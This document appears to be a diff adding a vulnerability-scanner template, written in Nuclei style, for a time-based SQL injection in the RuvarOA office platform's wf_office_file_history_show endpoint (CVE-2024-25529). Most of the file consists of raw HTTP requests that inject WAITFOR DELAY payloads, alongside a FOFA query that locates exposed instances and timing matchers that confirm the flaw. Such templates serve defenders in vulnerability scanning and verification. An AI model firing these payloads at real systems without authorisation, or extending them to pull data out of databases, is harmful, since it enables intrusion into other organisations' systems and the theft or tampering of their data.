@@ -1,0 +1,37 @@
+id: ruvaroa-wf_office_file_history_show-sqli
+info:
+  name: "RuvarOA协同办公平台 wf_office_file_history_show接口存在SQL注入漏洞"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: body="txt_admin_key"
+      RuvarOA协同办公平台多个接口存在SQL注入漏洞，攻击者可通过构造恶意请求执行非授权数据库操作，可能导致数据篡改、泄露或服务中断。
+  reference:
+  - CVE-2024-25529
+  tags: RuvarOA协同办公平台
+http:
+- raw:
+  - |
+    GET /WorkFlow/wf_office_file_history_show.aspx?id=1%27WAITFOR%20DELAY%20%270:0:5%27-- HTTP/1.1
+    Host: {{Hostname}}
+    Upgrade-Insecure-Requests: 1
+    User-Agent: micromessenger Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Iron Safari/537.36
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+    Accept-Encoding: gzip, deflate
+    Accept-Language: zh-CN,zh;q=0.9
+    Connection: close
+  - |
+    GET /WorkFlow/wf_office_file_history_show.aspx?id=1%27WAITFOR%20DELAY%20%270:0:8%27-- HTTP/1.1
+    Host: {{Hostname}}
+    Upgrade-Insecure-Requests: 1
+    User-Agent: micromessenger Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Iron Safari/537.36
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+    Accept-Encoding: gzip, deflate
+    Accept-Language: zh-CN,zh;q=0.9
+    Connection: close
+  matchers:
+  - type: dsl
+    dsl:
+    - duration_1>=5 && duration_1<=6
+    - duration_2>=8 && duration_2<=9
+    condition: and
